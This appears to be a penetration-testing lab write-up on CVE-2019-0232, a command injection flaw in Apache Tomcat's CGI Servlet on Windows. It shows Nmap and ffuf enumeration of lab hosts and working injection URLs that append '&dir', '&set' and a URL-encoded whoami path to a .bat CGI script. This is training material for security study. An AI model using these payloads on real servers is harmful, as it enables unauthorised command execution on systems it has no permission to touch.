---
description: >-
  CVE-2019-0232 is a critical security issue that could result in remote code
  execution. Affecting Windows systems that have the enableCmdLineArguments
  feature enabled.
---

# Attacking Tomcat CGI

## Intro

* exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, allowing them to execute arbitrary commands on the affected system.
* Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.
* CGI Servlet is a vital component of Apache Tomcat
* enables web servers to communicate with external applications beyond the Tomcat JVM
* external applications are typically CGI scripts written in languages like Perl, Python, or Bash.
* CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification.
* It is a middleware between web servers and external information resources like databases.

| **Advantages**                                                                               | **Disadvantages**                                                          |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| It is simple and effective for generating dynamic web content.                               | Incurs overhead by having to load programs into memory for each request.   |
| Use any programming language that can read from standard input and write to standard output. | Cannot easily cache data in memory between page requests.                  |
| Can reuse existing code and avoid writing new code.                                          | It reduces the server's performance and consumes a lot of processing time. |

* The `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string.
  * if true CGI Servlet parses the query string and passes it to the CGI script as arguments
* This feature can make CGI scripts more flexible and easier to write by allowing parameters to be passed to the script without using environment variables or standard input.
* CGI script can use command line arguments to switch between actions based on user input.

CGI script can use command line arguments to switch between these actions

```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

* `action` parameter is set to `title`
* `query` parameter specifies the search term "the great gatsby."

If the user wants to search by author, they can use a similar URL:

```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

* `action` parameter is set to `author`
  * script should search by author name
* `query` parameter specifies the search term "fitzgerald."

**problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script.**

* For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system.

```http
http://example.com/cgi-bin/hello.bat?&dir
```

* passes `&dir` as an argument to `hello.bat` and executes `dir` on the server.

## Enumeration

**Nmap - Open Ports**

```shell-session
nmap -p- -sC -Pn 10.129.204.227 --open 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time: 
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
```

* Look for operating system and versions of tomcat
  * `Apache Tomcat/9.0.17` running on port `8080`

**Finding a CGI script**

**Fuzzing Extentions - .CMD**

```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

> unsuccessful

the default directory for CGI scripts is `/cgi`

**Fuzzing Extentions - .BAT**

```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:

```txt
Welcome to CGI, this section is not functional yet. Please return to home page.
```

### Exploitation

we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&` since we know the path of valid CGI script already

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

run other common windows command line apps, such as `whoami` doesn't return an output.

**Retrieve a list of environmental variables by calling the `set` command:**

```http
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

`PATH` variable has been unset, so we will need to&#x20;

**hardcode paths in requests:**

```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

Error because a patch that utilises a regular expression to prevent the use of special characters

**URL-encoding the payload.**

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

## Assessment

**After running the URL Encoded 'whoami' payload, what user is tomcat running as?**

1. Search which port is Tomcat running
   1.  ```
       nmap -sC -Pn 10.129.205.30 --open  
       Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 23:46 EDT
       Nmap scan report for 10.129.205.30
       Host is up (0.18s latency).
       Not shown: 813 closed tcp ports (conn-refused), 181 filtered tcp ports (no-response)
       Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
       PORT     STATE SERVICE
       22/tcp   open  ssh
       | ssh-hostkey: 
       |   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
       |   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
       |_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
       135/tcp  open  msrpc
       139/tcp  open  netbios-ssn
       445/tcp  open  microsoft-ds
       8009/tcp open  ajp13
       | ajp-methods: 
       |_  Supported methods: GET HEAD POST OPTIONS
       8080/tcp open  http-proxy
       |_http-favicon: Apache Tomcat
       |_http-title: Apache Tomcat/9.0.17

       Host script results:
       | smb2-security-mode: 
       |   3:1:1: 
       |_    Message signing enabled but not required
       | smb2-time: 
       |   date: 2023-07-14T03:46:15
       |_  start_date: N/A

       Nmap done: 1 IP address (1 host up) scanned in 22.71 seconds
       ```

       8080
2. Get where the cgi script is located
   1. ```
      ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
      [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 243ms]
          * FUZZ: welcome
      ```
3. try to run whoami
   1.

       <figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>feldspar\omen</p></figcaption></figure>

